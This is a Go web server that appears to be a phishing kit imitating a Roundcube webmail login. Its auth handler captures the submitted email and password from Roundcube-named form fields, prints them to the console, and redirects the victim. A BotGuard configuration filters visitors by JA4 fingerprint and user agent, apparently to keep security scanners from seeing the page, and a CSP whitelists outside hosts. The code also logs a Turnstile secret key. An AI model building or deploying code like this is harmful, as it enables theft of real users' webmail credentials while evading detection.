package main

import (
	"fmt"
	"html/template"
	"log"
	"net/http"
	"os"
	"path/filepath"

	"github.com/joho/godotenv"
	"github.com/lulexhostt/authapp/middlewares"
	"gopkg.in/yaml.v2"
)

// BotGuardConfig struct for YAML file
type BotGuardConfig struct {
	MinVer string `yaml:"min_ver"`
	Ja4    struct {
		Allow []struct {
			B string `yaml:"b"`
		} `yaml:"allow"`
		Deny []struct {
			B string `yaml:"b"`
		} `yaml:"deny"`
	} `yaml:"ja4"`
	UserAgent struct {
		Allow []struct {
			Browser string `yaml:"browser"`
			Version string `yaml:"version"`
		} `yaml:"allow"`
		Deny []struct {
			Browser string `yaml:"browser"`
		} `yaml:"deny"`
	} `yaml:"user_agent"`
}

// setCSP sets the Content Security Policy header
func setCSP(w http.ResponseWriter) {
	w.Header().Set("Content-Security-Policy", "default-src 'self' https://logo.clearbit.com; img-src 'self' https://image.thum.io https://roundcube.secure.ne.jp https://i.imgur.com https://logo.clearbit.com; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://ajax.googleapis.com https://challenges.cloudflare.com; style-src 'self' 'unsafe-inline'; connect-src 'self' https://logo.clearbit.com https://image.thum.io https://baloncard.online; frame-src https://challenges.cloudflare.com;")
}

// authHandler handles authentication
func authHandler(w http.ResponseWriter, r *http.Request) {
	setCSP(w)

	if r.Method == http.MethodPost {
		r.ParseForm()
		email := r.FormValue("rcmloginuser")
		password := r.FormValue("rcmloginpwd")
		fmt.Printf("Email: %s, Password: %s\n", email, password)
		http.Redirect(w, r, "/dashboard", http.StatusSeeOther)
		return
	}

	tmpl, err := template.ParseFiles("templates/auth.html")
	if err != nil {
		http.Error(w, "Unable to load template", http.StatusInternalServerError)
		return
	}
	tmpl.Execute(w, nil)
}

// loadConfig loads the YAML configuration
func loadConfig() (*BotGuardConfig, error) {
	configPath, err := filepath.Abs("config/botguard.yaml") // Load from config folder
	if err != nil {
		return nil, err
	}
	data, err := os.ReadFile(configPath) // Use os.ReadFile instead of ioutil.ReadFile
	if err != nil {
		return nil, err
	}
	var config BotGuardConfig
	err = yaml.Unmarshal(data, &config)
	if err != nil {
		return nil, err
	}
	return &config, nil
}

func main() {
	// Load environment variables from .env file
	err := godotenv.Load()
	if err != nil {
		log.Fatalf("Error loading .env file: %v", err)
	}

	// Access the TURNSTILE_SECRET_KEY from environment variables
	turnstileSecretKey := os.Getenv("TURNSTILE_SECRET_KEY")
	fmt.Printf("Turnstile Secret Key: %s\n", turnstileSecretKey)

	// Load YAML config
	config, err := loadConfig()
	if err != nil {
		log.Fatalf("Error loading config: %v", err)
	}

	// Example usage of the config, this could be used inside the middleware
	fmt.Printf("Loaded BotGuard config: %+v\n", config)

	// Set up routes and middlewares
	mux := http.NewServeMux()
	mux.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.Dir("static"))))
	mux.Handle("/auth", middlewares.BotProtection(middlewares.RateLimiter(middlewares.SecurityHeaders(http.HandlerFunc(authHandler)))))

	fmt.Println("Server is running on port 8080...")
	http.ListenAndServe(":8080", mux)
}
